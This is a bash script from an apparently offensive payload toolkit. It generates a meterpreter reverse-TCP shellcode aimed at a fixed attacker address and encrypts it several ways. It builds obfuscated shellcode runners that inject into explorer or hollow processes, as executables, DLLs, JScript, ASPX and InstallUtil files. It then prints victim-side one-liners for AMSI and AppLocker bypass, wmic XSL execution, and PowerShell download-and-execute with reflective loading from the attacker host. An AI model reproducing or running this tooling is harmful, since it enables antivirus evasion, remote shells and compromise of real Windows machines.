#!/bin/bash

HOME=`echo $HOME`
CURRENT_DIR=`echo $PWD`
PAYLOADS=$CURRENT_DIR"/payloads"
CONFUSER=$CURRENT_DIR"/ConfuserEx/Confuser.CLI.exe"
NET_OBFUSCATOR=$CURRENT_DIR"/NET-Obfuscate/NET-Obfuscate.exe"
OUTPUT_CAESAR_DIR=$CURRENT_DIR"/payloads/ConfuserEx/Caesar"
OUTPUT_XOR_DIR=$CURRENT_DIR"/payloads/ConfuserEx/XOR"

PROCESS_TO_INJECT="explorer"
MSFVENOM_PAYLOAD="windows/x64/meterpreter/reverse_tcp"
LHOST="192.168.49.121"
LPORT=8080


#Generating a shellcode
MSFVENOM=" -p $MSFVENOM_PAYLOAD LHOST=$LHOST LPORT=$LPORT -f csharp -o shellcode.txt"
echo "[+] Generating a shellcode ..."
msfvenom$MSFVENOM &>/dev/null
#BYTES=`cat shellcode.txt | grep "new byte\[" | grep -Po "\\d+"`

#Reading the contents
echo "[+] Reading the shellcode.txt ..."
FILENAME="shellcode.txt"
SHELLCODE=`cat $FILENAME | tr -d '\n' | awk -F \{ '{print $2}' | awk -F \} '{print $1}'`
#echo $SHELLCODE

# Appending Shellcode to encrypters
echo "[+] Appending Shellcode ..."
sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${SHELLCODE}"' }/g' Templates/Caesar/caesar_encrypter.cs
sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${SHELLCODE}"' }/g' Templates/XOR/xor_encrypter.cs
sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${SHELLCODE}"' }/g' Templates/XOR/xor_encrypter_v2.cs 

# Update the Injected Process name
sed -i 's/Process.GetProcessesByName(.*.).0..Id/Process.GetProcessesByName("'${PROCESS_TO_INJECT}'")[0].Id/g' Templates/Caesar/shellcode_runner_assembly.cs
sed -i 's/Process.GetProcessesByName(.*.).0..Id/Process.GetProcessesByName("'${PROCESS_TO_INJECT}'")[0].Id/g' Templates/Caesar/shellcode_runner_assembly_numa.cs
sed -i 's/Process.GetProcessesByName(.*.).0..Id/Process.GetProcessesByName("'${PROCESS_TO_INJECT}'")[0].Id/g' Templates/XOR/shellcode_runner_assembly.cs
sed -i 's/Process.GetProcessesByName(.*.).0..Id/Process.GetProcessesByName("'${PROCESS_TO_INJECT}'")[0].Id/g' Templates/XOR/shellcode_runner_assembly_numa.cs


# Complile Encrypters.cs 
echo "[+] Compile the CS file..."
mcs Templates/Caesar/caesar_encrypter.cs
mcs -platform:x64 Templates/XOR/xor_encrypter.cs
mcs -platform:x64 Templates/XOR/xor_encrypter_v2.cs

# Generating Encrypted Shellcodes.
echo "[+] Generating Encrypted shellcodes ..."
CAESARED_SHELLCODE=`mono Templates/Caesar/caesar_encrypter.exe` 
XORED_SHELLCODE=`mono Templates/XOR/xor_encrypter.exe`
XORED_SHELLCODEv2=`mono Templates/XOR/xor_encrypter_v2.exe`
#echo $CAESARED_SHELLCODE 

# Append Encrypted Shellcodes to Shellcode Runners.
#echo "[+] Appending encrypted Caesared Shellcodes ..."
sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${CAESARED_SHELLCODE}"' }/g' Templates/Caesar/shellcode_runner_assembly.cs
sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${CAESARED_SHELLCODE}"' }/g' Templates/Caesar/shellcode_runner_assembly_numa.cs
sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${CAESARED_SHELLCODE}"' }/g' Templates/Caesar/shellcode_runner_assembly_numa_marshal.cs
sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${CAESARED_SHELLCODE}"' }/g' Templates/Caesar/shellcode_runner_assembly_FlsAlloc_marshal.cs
sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${CAESARED_SHELLCODE}"' }/g' Templates/Caesar/shellcode_runner_hollow.cs
sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${CAESARED_SHELLCODE}"' }/g' Templates/Caesar/shellcode_runner_hollow_dotnet2jsscript.cs
sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${CAESARED_SHELLCODE}"' }/g' payloads/ASPX/shellcode_runner_caesar.aspx

sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${XORED_SHELLCODE}"' }/g' Templates/XOR/shellcode_runner_assembly.cs
sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${XORED_SHELLCODE}"' }/g' Templates/XOR/shellcode_runner_assembly_dotnet2jsscript.cs
sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${XORED_SHELLCODE}"' }/g' Templates/XOR/shellcode_runner_assembly_numa.cs
sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${XORED_SHELLCODE}"' }/g' Templates/XOR/shellcode_runner_assembly_numa_marshal.cs
sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${XORED_SHELLCODE}"' }/g' Templates/XOR/shellcode_runner_assembly_FlsAlloc_marshal.cs
sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${XORED_SHELLCODE}"' }/g' Templates/XOR/shellcode_runner_hollow.cs
sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${XORED_SHELLCODE}"' }/g' Templates/XOR/shellcode_runner_hollow_dotnet2jsscript.cs

sed -i 's/unsigned char enc_payload.. . .*./unsigned char enc_payload[] = { '"${XORED_SHELLCODEv2}"' };/g' Templates/XOR/shellcode_runner_xor.cpp


# Compile Shellcode Runner as DLL
echo "[+] Creating DLL ..."
mcs -target:library -out:payloads/Caesar/shellcode_runner_assembly.dll Templates/Caesar/shellcode_runner_assembly.cs &>/dev/null
mcs -target:library -out:payloads/Caesar/shellcode_runner_assembly_numa.dll Templates/Caesar/shellcode_runner_assembly_numa.cs &>/dev/null
mcs -target:library -out:payloads/Caesar/shellcode_runner_assembly_numa_marshal.dll Templates/Caesar/shellcode_runner_assembly_numa_marshal.cs &>/dev/null
mcs -target:library -out:payloads/Caesar/shellcode_runner_assembly_FlsAlloc_marshal.dll Templates/Caesar/shellcode_runner_assembly_FlsAlloc_marshal.cs &>/dev/null
mcs -target:library -out:payloads/Caesar/shellcode_runner_hollow.dll Templates/Caesar/shellcode_runner_hollow.cs &>/dev/null
mcs -target:library -out:payloads/Caesar/shellcode_runner_hollow_dotnet2jsscript.dll Templates/Caesar/shellcode_runner_hollow_dotnet2jsscript.cs &>/dev/null

mcs -target:library -out:payloads/XOR/shellcode_runner_assembly.dll Templates/XOR/shellcode_runner_assembly.cs &>/dev/null
mcs -target:library -out:payloads/XOR/shellcode_runner_assembly_dotnet2jsscript.dll Templates/XOR/shellcode_runner_assembly_dotnet2jsscript.cs &>/dev/null
mcs -target:library -out:payloads/XOR/shellcode_runner_assembly_numa.dll Templates/XOR/shellcode_runner_assembly_numa.cs &>/dev/null
mcs -target:library -out:payloads/XOR/shellcode_runner_assembly_numa_marshal.dll Templates/XOR/shellcode_runner_assembly_numa_marshal.cs &>/dev/null
mcs -target:library -out:payloads/XOR/shellcode_runner_assembly_FlsAlloc_marshal.dll Templates/XOR/shellcode_runner_assembly_FlsAlloc_marshal.cs &>/dev/null
mcs -target:library -out:payloads/XOR/shellcode_runner_hollow.dll Templates/XOR/shellcode_runner_hollow.cs &>/dev/null
mcs -target:library -out:payloads/XOR/shellcode_runner_hollow_dotnet2jsscript.dll Templates/XOR/shellcode_runner_hollow_dotnet2jsscript.cs &>/dev/null

#mcs -target:library -platform:x86 -out:ExampleAssembly.dll shellcode_runner.cs
#cp ExampleAssembly.dll payloads/

# Complile the Shellcode Runner as EXE
echo "[+] Creating EXE ..."
mcs -platform:x64 -out:payloads/Caesar/shellcode_runner_assembly.exe Templates/Caesar/shellcode_runner_assembly.cs &>/dev/null
mcs -platform:x64 -out:payloads/Caesar/shellcode_runner_assembly_numa.exe Templates/Caesar/shellcode_runner_assembly_numa.cs &>/dev/null
mcs -platform:x64 -out:payloads/Caesar/shellcode_runner_assembly_numa_marshal.exe Templates/Caesar/shellcode_runner_assembly_numa_marshal.cs &>/dev/null
mcs -platform:x64 -out:payloads/Caesar/shellcode_runner_assembly_FlsAlloc_marshal.exe Templates/Caesar/shellcode_runner_assembly_FlsAlloc_marshal.cs &>/dev/null
mcs -platform:x64 -out:payloads/Caesar/shellcode_runner_hollow.exe Templates/Caesar/shellcode_runner_hollow.cs &>/dev/null
mcs -platform:x64 -out:payloads/Caesar/shellcode_runner_hollow_dotnet2jsscript.exe Templates/Caesar/shellcode_runner_hollow_dotnet2jsscript.cs &>/dev/null


mcs -platform:x64 -out:payloads/XOR/shellcode_runner_assembly.exe Templates/XOR/shellcode_runner_assembly.cs &>/dev/null
mcs -platform:x64 -out:payloads/XOR/shellcode_runner_assembly_dotnet2jsscript.exe Templates/XOR/shellcode_runner_assembly_dotnet2jsscript.cs &>/dev/null
mcs -platform:x64 -out:payloads/XOR/shellcode_runner_assembly_numa.exe Templates/XOR/shellcode_runner_assembly_numa.cs &>/dev/null
mcs -platform:x64 -out:payloads/XOR/shellcode_runner_assembly_numa_marshal.exe Templates/XOR/shellcode_runner_assembly_numa_marshal.cs &>/dev/null
mcs -platform:x64 -out:payloads/XOR/shellcode_runner_assembly_FlsAlloc_marshal.exe Templates/XOR/shellcode_runner_assembly_FlsAlloc_marshal.cs &>/dev/null
mcs -platform:x64 -out:payloads/XOR/shellcode_runner_hollow.exe Templates/XOR/shellcode_runner_hollow.cs


echo "[+] Creating C++ EXE (plus UPX) ..."
x86_64-w64-mingw32-gcc Templates/XOR/shellcode_runner_xor.cpp -o payloads/XOR/shellcode_runner_cpp.exe &>/dev/null
upx -9 payloads/XOR/shellcode_runner_cpp.exe &>/dev/null


# Generate a payload
echo "[+] Creating JS ..."
mono DotNetToJScript.exe payloads/XOR/shellcode_runner_hollow_dotnet2jsscript.dll --lang=Jscript --ver=v4 -o payloads/DotNetToJScript/runner_xor.js -c Runner.TestClass &>/dev/null
mono DotNetToJScript.exe payloads/Caesar/shellcode_runner_hollow_dotnet2jsscript.dll --lang=Jscript --ver=v4 -o payloads/DotNetToJScript/runner_caesar.js -c Runner.TestClass &>/dev/null
mono DotNetToJScript.exe payloads/Caesar/shellcode_runner_assembly_dotnet2jsscript.dll --lang=Jscript --ver=v4 -o payloads/DotNetToJScript/runner.js -c Runner.TestClass &>/dev/null

# Copy file share
#echo "[+] shellcode_runner.js copied to Payloads"
tr -d $'\r' < payloads/DotNetToJScript/runner_xor.js > payloads/DotNetToJScript/shellcode_runner_xor.js
tr -d $'\r' < payloads/DotNetToJScript/runner_caesar.js > payloads/DotNetToJScript/shellcode_runner_caesar.js
tr -d $'\r' < payloads/DotNetToJScript/runner.js > payloads/DotNetToJScript/shellcode_runner.js

echo "[+] Creating HTA ..."
python add_code.py

echo "[+] Creating XSL ..."

echo "[+] Creating TXT ..."
cp Templates/AMSI/amsi_runner_template.txt payloads/AMSI/shellcode_runner.txt
sed -i 's/SHELLCODE/'"${SHELLCODE}"'/g' payloads/AMSI/shellcode_runner.txt

#echo "[+] Creating MSI ..."
#mono Templates/MSI/wix311-binaries/candle.exe -out Templates/MSI/ -arch x64 Templates/MSI/shellcode_runner.xml &>/dev/null
#wine Templates/MSI/wix311-binaries/light.exe -out Templates/MSI/shellcode_runner.msi Templates/MSI/shellcode_runner.wixobj -sval &>/dev/null
#rm Templates/MSI/shellcode_runner.wixpdb
#rm Templates/MSI/shellcode_runner.wixobj
#mv Templates/MSI/shellcode_runner.msi payloads/MSI/shellcode_runner.msi

echo "[+] Creating InstallUtil ..."
cp Templates/Applocker/InstallUtil.cs payloads/Applocker/
sed -i 's/KALI_IP/'${LHOST}'/g' payloads/Applocker/InstallUtil.cs
mcs -r:Templates/Applocker/System.Management.Automation.dll -r:System.Configuration.Install -out:payloads/Applocker/InstallUtil.exe payloads/Applocker/InstallUtil.cs

echo "[+] Creating AES + Deflate ..."
cp Templates/AES/AES_Deflate_HTTP.cs payloads/AES/AES_Deflate_HTTP.cs
cp Templates/AES/AES_Deflate_SMB.cs payloads/AES/AES_Deflate_SMB.cs
sed -i 's/KALI_IP/'${LHOST}'/g' payloads/AES/AES_Deflate_HTTP.cs
sed -i 's/KALI_IP/'${LHOST}'/g' payloads/AES/AES_Deflate_SMB.cs
mcs -platform:x64 -out:payloads/AES/AES_Deflate_HTTP.exe payloads/AES/AES_Deflate_HTTP.cs
mcs -platform:x64 -out:payloads/AES/AES_Deflate_SMB.exe payloads/AES/AES_Deflate_SMB.cs


echo "[+] Creating web.config file (Non-Encrypted)..."
MSFVENOM=" -p $MSFVENOM_PAYLOAD LHOST=$LHOST LPORT=$LPORT -f aspx -o payloads/ASPX/shellcode_runner.aspx"
msfvenom$MSFVENOM &>/dev/null
python add_code2.py

echo "[+] Creating ASPX file (Non-Encrypted) ..."
echo "[+] AMSI bypass (Patching, Unhooking) ..."
echo "[+] Generating a 3DES Shellcode Runner ..."
pwsh -c ". ./Templates/3DES/TripleDESEncryptor.ps1;TripleDESEncryption -Password oqphnbt0kuedizy4m3avx6r5lf21jc8s -Salt vh9b4tsxrl1560wg8nda2meuc7yjzop3 -File 'payloads/XOR/shellcode_runner_assembly.exe' -EncryptedBinaryFile 'payloads/3DES/shellcode_runner_assembly_3des.exe'" &>/dev/null
pwsh -c ". ./Templates/3DES/TripleDESEncryptor.ps1;TripleDESEncryption -Password oqphnbt0kuedizy4m3avx6r5lf21jc8s -Salt vh9b4tsxrl1560wg8nda2meuc7yjzop3 -File 'payloads/XOR/shellcode_runner_assembly_numa_marshal.exe' -EncryptedBinaryFile 'payloads/3DES/shellcode_runner_assembly_numa_marshal_3des.exe'" &>/dev/null
pwsh -c "\$bytes = [System.IO.File]::ReadAllBytes(\"payloads/3DES/shellcode_runner_assembly_3des.exe\");\$EncodedText = [Convert]::ToBase64String(\$bytes);\$encodedText > payloads/3DES/shellcode_runner_b64.txt"
pwsh -c "\$bytes = [System.IO.File]::ReadAllBytes(\"payloads/3DES/shellcode_runner_assembly_numa_marshal_3des.exe\");\$EncodedText=[Convert]::ToBase64String(\$bytes);\$encodedText > payloads/3DES/shellcode_runner_marshal_b64.txt"
B64_EMBEDED=`cat payloads/3DES/shellcode_runner_b64.txt`
B64_EMBEDED_MARSHAL=`cat payloads/3DES/shellcode_runner_marshal_b64.txt`
cp Templates/3DES/des_decryptor_embeded.cs payloads/3DES/des_decryptor_embeded.cs
cp Templates/3DES/des_decryptor_embeded_marshal.cs payloads/3DES/des_decryptor_embeded_marshal.cs
sed -i 's#.*EncryptedB64String = .B64_PAYLOAD.#string EncryptedB64String = "'${B64_EMBEDED}'"#g' payloads/3DES/des_decryptor_embeded.cs
sed -i 's#.*EncryptedB64String = .B64_PAYLOAD.#string EncryptedB64String = "'${B64_EMBEDED_MARSHAL}'"#g' payloads/3DES/des_decryptor_embeded_marshal.cs
mcs -platform:x64 Templates/3DES/des_decryptor.cs &>/dev/null
mcs -platform:x64 payloads/3DES/des_decryptor_embeded.cs &>/dev/null
mcs -platform:x64 payloads/3DES/des_decryptor_embeded_marshal.cs &>/dev/null 
cp Templates/3DES/des_decryptor.exe payloads/3DES/des_decryptor.exe

echo "[+] Creating DLL/EXE file (ConfuserEx + .NET Obfuscator) ..."
echo ""
mono $CONFUSER $PAYLOADS/Caesar/shellcode_runner_assembly_numa.exe -o $OUTPUT_CAESAR_DIR &>/dev/null
OBFUSCATED=`mono $NET_OBFUSCATOR --in-file $OUTPUT_CAESAR_DIR/shellcode_runner_assembly_numa.exe`
CLASS=`echo $OBFUSCATED |grep -oP '(?<=NonEmulated -> ).\w+'`
PROGRAM=`echo $OBFUSCATED |grep -oP '(?<=Program -> ).\w+'`
MAIN=`echo $OBFUSCATED |grep -oP '(?<=Main -> ).\w+'`

echo " _____________________________________________________________________________________________________________________________________"
echo "|                                                     Unhooking AMSI                                                                  |"
echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
echo "| [1] Upload unhook_amsi.exe and MinHook.NET.dll to the victim                                                                        |"
echo "| [2] Execution: unhook_amsi.exe http://"${LHOST}"/shellcode_runner.exe                                                          |"
echo "|_____________________________________________________________________________________________________________________________________|"
echo ""
echo " _____________________________________________________________________________________________________________________________________"
echo "|                                                     Triple DES Execution                                                            |"
echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
echo "| [1] Example: des_decryptor.exe \"http://"${LHOST}"/des_decryptor_embedded.exe\"                                                  |"
echo "| [2] Example: des_decryptor.exe \"http://"${LHOST}"/des_decryptor_embedded_marshal.exe\"                                          |"
echo "| [3] Example: des_decryptor_embeded.exe                                                                                              |"
echo "| [4] Example: des_decryptor_embedded_marshal.exe                                                                                     |"
echo "|_____________________________________________________________________________________________________________________________________|"
echo ""
echo " _____________________________________________________________________________________________________________________________________"
echo "|                                                     AES + Deflate                                                                   |"
echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
echo "| [1] Upload 'AES_Deflate_SMB.exe' or 'AES_Deflate_HTTP.exe' to the victim                                                            |"
echo "| [2] Copy 'AES_Deflate_SMB.exe' to SMB share or 'AES_Deflate_HTTP.exe' to Apache                                                     |"
echo "| [3] Execution via Reflection:                                                                                                       |"
echo "|     PS> $data=[IO.File]::ReadAllBytes('C:\Users\user\Desktop\AES_Deflate_SMB.exe')                                                  |"
echo "|     PS> $ass=[System.Reflection.Assembly]::Load($data)                                                                              |"
echo "|     PS> $ass.EntryPoint.Invoke($null,@($null))                                                                                      |"
echo "|_____________________________________________________________________________________________________________________________________|"
echo ""

mono $CONFUSER $PAYLOADS/Caesar/shellcode_runner_assembly_numa_marshal.exe -o $OUTPUT_CAESAR_DIR &>/dev/null
OBFUSCATED=`mono $NET_OBFUSCATOR --in-file $OUTPUT_CAESAR_DIR/shellcode_runner_assembly_numa_marshal.exe`
CLASS=`echo $OBFUSCATED |grep -oP '(?<=NonEmulated -> ).\w+'`
PROGRAM=`echo $OBFUSCATED |grep -oP '(?<=Program -> ).\w+'`
MAIN=`echo $OBFUSCATED |grep -oP '(?<=Main -> ).\w+'`
echo " _____________________________________________________________________________________________________________________________________"
echo "|                                          ConfuserEx  +  Net-Obfuscate Execution                                                     |"
echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
echo "| [*] Obfusacating 'Caesar' encrypted Shellcode Runner: shellcode_runner_assembly_numa.exe                                            |"
echo "|                                                                                                                                     |"
echo "| PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://"${LHOST}"/shellcode_runner_assembly_numa.exe')                |"
echo "| PS>\$ass=[System.Reflection.Assembly]::Load(\$data)                                                                                   |"
echo "| PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)                                                |"
echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
echo "| [*] Obfusacating 'Caesar' encrypted Shellcode Runner: shellcode_runner_assembly_numa_marshal.exe                                    |"
echo "|                                                                                                                                     |"
echo "| PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://"${LHOST}"/shellcode_runner_assembly_numa_marshal.exe')        |"
echo "| PS>\$ass=[System.Reflection.Assembly]::Load(\$data)                                                                                  |"
echo "| PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)                                                |"
echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
echo "| [*] Obfusacating 'Caesar' encrypted Shellcode Runner: shellcode_runner_assembly_numa.dll                                            |"
mono $CONFUSER $PAYLOADS/Caesar/shellcode_runner_assembly_numa.dll -o $OUTPUT_CAESAR_DIR &>/dev/null
OBFUSCATED=`mono $NET_OBFUSCATOR --in-file $OUTPUT_CAESAR_DIR/shellcode_runner_assembly_numa.dll`
CLASS=`echo $OBFUSCATED |grep -oP '(?<=NonEmulated -> ).\w+'`
PROGRAM=`echo $OBFUSCATED |grep -oP '(?<=Program -> ).\w+'`
MAIN=`echo $OBFUSCATED |grep -oP '(?<=Main -> ).\w+'`
echo "|                                                                                                                                     |"
echo "| PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://"${LHOST}"/shellcode_runner_assembly_numa.dll')                 |"
echo "| PS>\$ass=[System.Reflection.Assembly]::Load(\$data)                                                                                   |"
echo "| PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)                                                |"
echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
echo "| [*] Obfusacating 'Caesar' encrypted Shellcode Runner: shellcode_runner_assembly_numa_marshal.dll                                    |"
mono $CONFUSER $PAYLOADS/Caesar/shellcode_runner_assembly_numa_marshal.dll -o $OUTPUT_CAESAR_DIR &>/dev/null
OBFUSCATED=`mono $NET_OBFUSCATOR --in-file $OUTPUT_CAESAR_DIR/shellcode_runner_assembly_numa_marshal.dll`
CLASS=`echo $OBFUSCATED |grep -oP '(?<=NonEmulated -> ).\w+'`
PROGRAM=`echo $OBFUSCATED |grep -oP '(?<=Program -> ).\w+'`
MAIN=`echo $OBFUSCATED |grep -oP '(?<=Main -> ).\w+'`
echo "|                                                                                                                                     |"
echo "| PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://"${LHOST}"/shellcode_runner_assembly_numa_marshal.dll')         |"
echo "| PS>\$ass=[System.Reflection.Assembly]::Load(\$data)                                                                               	|"
echo "| PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)                                                |"
echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
echo "| [*] Obfusacating 'XOR' encrypted Shellcode Runner: shellcode_runner_assembly_numa.exe                                               |"
mono $CONFUSER $PAYLOADS/XOR/shellcode_runner_assembly_numa.exe -o $OUTPUT_XOR_DIR &>/dev/null
OBFUSCATED=`mono $NET_OBFUSCATOR --in-file $OUTPUT_XOR_DIR/shellcode_runner_assembly_numa.exe`
CLASS=`echo $OBFUSCATED |grep -oP '(?<=NonEmulated -> ).\w+'`
PROGRAM=`echo $OBFUSCATED |grep -oP '(?<=Program -> ).\w+'`
MAIN=`echo $OBFUSCATED |grep -oP '(?<=Main -> ).\w+'`
echo "|                                                                                                                                     |"
echo "| PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://"${LHOST}"/shellcode_runner_assembly_numa.exe')                |"
echo "| PS>\$ass=[System.Reflection.Assembly]::Load(\$data)                                                                                   |"
echo "| PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)                                                |"
echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
echo "| [*] Obfusacating 'XOR' encrypted Shellcode Runner: shellcode_runner_assembly_numa_marshal.exe                                       |"
mono $CONFUSER $PAYLOADS/XOR/shellcode_runner_assembly_numa_marshal.exe -o $OUTPUT_XOR_DIR &>/dev/null
OBFUSCATED=`mono $NET_OBFUSCATOR --in-file $OUTPUT_XOR_DIR/shellcode_runner_assembly_numa_marshal.exe`
CLASS=`echo $OBFUSCATED |grep -oP '(?<=NonEmulated -> ).\w+'`
PROGRAM=`echo $OBFUSCATED |grep -oP '(?<=Program -> ).\w+'`
MAIN=`echo $OBFUSCATED |grep -oP '(?<=Main -> ).\w+'`
echo "|                                                                                                                                     |"
echo "| PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://"${LHOST}"/shellcode_runner_assembly_numa_marshal.exe')        |"
echo "| PS>\$ass=[System.Reflection.Assembly]::Load(\$data)                                                                                   |"
echo "| PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)                                                |"
echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
echo "| [*] Obfusacating 'XOR' encrypted Shellcode Runner: shellcode_runner_assembly_numa.dll                                               |"
mono $CONFUSER $PAYLOADS/XOR/shellcode_runner_assembly_numa.dll -o $OUTPUT_XOR_DIR &>/dev/null
OBFUSCATED=`mono $NET_OBFUSCATOR --in-file $OUTPUT_XOR_DIR/shellcode_runner_assembly_numa.dll`
CLASS=`echo $OBFUSCATED |grep -oP '(?<=NonEmulated -> ).\w+'`
PROGRAM=`echo $OBFUSCATED |grep -oP '(?<=Program -> ).\w+'`
MAIN=`echo $OBFUSCATED |grep -oP '(?<=Main -> ).\w+'`
echo "|                                                                                                                                     |"
echo "| PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://"${LHOST}"/shellcode_runner_assembly_numa.dll')               |"
echo "| PS>\$ass=[System.Reflection.Assembly]::Load(\$data)                                                                                   |"
echo "| PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)                                                |"
echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
echo "| [*] Obfusacating 'XOR' encrypted Shellcode Runner: shellcode_runner_assembly_numa_marshal.dll                                       |"
mono $CONFUSER $PAYLOADS/XOR/shellcode_runner_assembly_numa_marshal.dll -o $OUTPUT_XOR_DIR &>/dev/null
OBFUSCATED=`mono $NET_OBFUSCATOR --in-file $OUTPUT_XOR_DIR/shellcode_runner_assembly_numa_marshal.dll`
CLASS=`echo $OBFUSCATED |grep -oP '(?<=NonEmulated -> ).\w+'`
PROGRAM=`echo $OBFUSCATED |grep -oP '(?<=Program -> ).\w+'`
MAIN=`echo $OBFUSCATED |grep -oP '(?<=Main -> ).\w+'`
echo "|                                                                                                                                     |"
echo "| PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://"${LHOST}"/shellcode_runner_assembly_numa_marshal.dll')       |"
echo "| PS>\$ass=[System.Reflection.Assembly]::Load(\$data)                                                                                   |"
echo "| PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)                                                |"
echo "|_____________________________________________________________________________________________________________________________________|"

echo ""
echo " _____________________________________________________________________________________________________________________________________"
echo "|                                                .NET ASSEMBLY EXECUTION                                                              |"
echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
echo "| [+] Assembly - Local Execution or via SMB [+]                                                                                       |"
echo "| \$data=[IO.File]::ReadAllBytes('shellcode_runner.exe|dll')                                                                          |"
echo "| \$ass=[System.Reflection.Assembly]::Load(\$data)                                                                                    |"
echo "| \$ass.GetType(\"Runner.TestClass\").GetMethod(\"Main\").Invoke(\$null,@(,\$null))                                                   |"
echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
echo "| [+] Assembly - Remote Execution  [+]                                                                                                |"
echo "| \$data=(New-Object System.Net.WebClient).DownloadData('http://"${LHOST}"/shellcode_runner.exe|dll')                                 |"
echo "| \$ass=[System.Reflection.Assembly]::Load(\$data)                                                                                    |"
echo "| \$ass.GetType(\"Runner.TestClass\").GetMethod(\"Main\").Invoke(\$null,@(,\$null))                                                   |"
echo "|_____________________________________________________________________________________________________________________________________|"

echo ""
echo " _____________________________________________________________________________________________________________________________________"
echo "| [+] XSL execution [+]                                                                                                               |"
echo "| wmic process list /FORMAT:shellcode_runner.xsl                                                                                       "
echo "| wmic os get /FORMAT:\"http://"${LHOST}"/shellcode_runner.xsl\"                                                                       "
echo "|_____________________________________________________________________________________________________________________________________|"
echo ""
echo " _____________________________________________________________________________________________________________________________________"
echo "|                                             PowerShell DownloadString                                                               |"
echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
echo "| [+] AMSI bypass [+]                                                                                                                  "
echo "| powershell -nop -exec bypass -c IEX((New-Object Net.WebClient).DownloadString('http://"${LHOST}"/shellcode_runner.html'));           "
echo "|_____________________________________________________________________________________________________________________________________|"

# Delete Files
rm shellcode.txt
